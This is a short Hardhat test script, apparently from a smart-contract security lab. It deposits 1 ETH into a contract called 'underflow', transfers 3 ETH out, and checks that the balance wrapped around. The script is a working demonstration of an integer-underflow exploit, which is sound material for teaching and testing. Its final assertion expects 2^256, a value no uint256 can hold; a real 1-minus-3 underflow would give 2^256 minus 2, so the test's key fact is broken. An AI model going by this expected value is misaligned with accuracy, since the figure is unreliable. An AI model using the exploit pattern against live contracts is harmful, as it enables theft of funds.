const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Underflow vulnerability", function() {
    this.timeout(100000);

    it("Should underflow", async function() {
        // deploy
        let [addr1, addr2] = await ethers.getSigners();
        const underflowFactory = await ethers.getContractFactory("underflow");
        const underflowContract = await underflowFactory.deploy();
        await underflowContract.deployed();

        // deposit 1 eth
        await underflowContract.connect(addr1).deposit({
            value: ethers.utils.parseEther("1")
        });
        expect(await underflowContract.balanceOf(addr1.address)).to.equal(ethers.utils.parseEther("1"));

        // transfer 3 eth
        await underflowContract.connect(addr1).transfer(addr2.address, ethers.utils.parseEther("3"));

        // check underflow
        expect(await underflowContract.balanceOf(addr1.address)).to.equal('115792089237316195423570985008687907853269984665640564039455584007913129639936');
    });
});